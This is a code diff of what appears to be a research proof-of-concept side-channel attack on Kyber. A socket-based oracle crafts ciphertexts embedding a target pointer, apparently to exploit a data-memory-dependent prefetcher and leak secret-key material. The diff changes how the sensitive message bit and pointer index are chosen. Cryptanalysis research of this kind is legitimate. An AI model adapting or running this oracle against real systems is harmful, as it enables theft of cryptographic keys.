@@ -41,21 +41,21 @@ class KyberOracle:
 
         self.rand_mask = recv_exact(self._sock, 8)
         self.masked_addr = recv_exact(self._sock, 8)
-        self.lowest_message_bit = 7
-        # There is an off-by-one problem: if message bit is 0, then
-        # (v - dot(u, s))[lowest_message_bit] - threshold result in 0
-        # when the value is Q/4=832, but when message bit is 1, we
-        # instead get -832 which is compressed to 1! That is because uncompressed v instead of Q/2=1664 goes to 1665. So, we look
-        # for offset of message which has a one at sensitive for DMP
-        # position, but we XOR that position with 1, so we end up
-        # with zero
-        for i in range(7, 56):
-            rbit = (self.rand_mask[i // 8] >> (i & 7)) & 1
-            mabit = (self.masked_addr[i // 8] >> (i & 7)) & 1
-            mbit = rbit ^ mabit
-            if mbit == 1:
-                self.lowest_message_bit = i
-                break
+        # self.lowest_message_bit = 7
+        # # There is an off-by-one problem: if message bit is 0, then
+        # # (v - dot(u, s))[lowest_message_bit] - threshold result in 0
+        # # when the value is Q/4=832, but when message bit is 1, we
+        # # instead get -832 which is compressed to 1! That is because uncompressed v instead of Q/2=1664 goes to 1665. So, we look
+        # # for offset of message which has a one at sensitive for DMP
+        # # position, but we XOR that position with 1, so we end up
+        # # with zero
+        # for i in range(7, 56):
+        #     rbit = (self.rand_mask[i // 8] >> (i & 7)) & 1
+        #     mabit = (self.masked_addr[i // 8] >> (i & 7)) & 1
+        #     mbit = rbit ^ mabit
+        #     if mbit == 1:
+        #         self.lowest_message_bit = i
+        #         break
 
     def query(self, ct: bytes) -> int:
         """
@@ -82,9 +82,7 @@ def read_sk(filename):
     return sk
 
 
-def build_polymsg_from_oracle(
-    oracle, val_for_one, use_random, target_ptr_idx=0
-) -> Poly:
+def build_polymsg_from_oracle(oracle, val_for_one, use_random) -> Poly:
     """
     Create a message encoded in polynomial that should appear for
     victim. The first 64-bit contain a target pointer that is computed
@@ -95,6 +93,7 @@ def build_polymsg_from_oracle(
     to other positions
     """
     v = Poly()
+    target_ptr_idx = oracle.lowest_message_bit % 64
     msg_byte_index = oracle.lowest_message_bit // 8
     msg_bit_mask = 1 << (oracle.lowest_message_bit & 7)
 
@@ -181,9 +180,7 @@ def build_naive_ciphertext(
     """
     u = PolyVec()
 
-    v = build_polymsg_from_oracle(
-        oracle, KYBER_Q // 2 + 1, use_random=True, target_ptr_idx=block_idx
-    )
+    v = build_polymsg_from_oracle(oracle, KYBER_Q // 2 + 1, use_random=True)
     # m_list = list(map(lambda x: int(x != 0), v.coeffs))
     # m = bytearray(32)
     # for pos in range(len(m_list)):
